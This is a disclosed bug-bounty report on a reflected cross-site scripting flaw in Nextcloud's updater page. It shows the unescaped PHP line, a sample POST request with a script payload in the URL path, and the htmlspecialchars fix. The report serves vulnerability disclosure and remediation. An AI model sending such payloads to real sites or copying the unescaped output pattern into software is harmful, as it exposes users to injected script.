---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '515484'
original_report_id: '515484'
title: '[Reflected XSS] In Request URL'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: nextcloud
created_at: '2019-03-26T10:13:25.245Z'
disclosed_at: '2020-03-01T13:18:48.738Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 37
asset_identifier: nextcloud/updater
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [Reflected XSS] In Request URL

## Metadata

- HackerOne Report ID: 515484
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: nextcloud
- Disclosed At: 2020-03-01T13:18:48.738Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

In [index.php file](https://github.com/nextcloud/updater/blob/master/index.php#L1765) on 1765 we can see XSS:
`<a class="button" href="<?php echo str_replace('/index.php', '/../', $updaterUrl); ?>">`
Because NextCloud allow links like: '/index.php/{ANY_CONTENT}'
If we will do request like: 
```
POST /updater/index.php/h"><script>alert(1);</script> HTTP/1.1
Host: vulns.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

updater-secret-input={OUR_SECRET}
```
We will see Reflected XSS: F452129
To fix this vulnerability need to patch `<a class="button" href="<?php echo str_replace('/index.php', '/../', $updaterUrl); ?>">` to `<a class="button" href="<?php echo htmlspecialchars(str_replace('/index.php', '/../', $updaterUrl), ENT_QUOTES); ?>">`

## Impact

If the attacker knows the secret phrase, then they can implode illegitimate html code in page

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
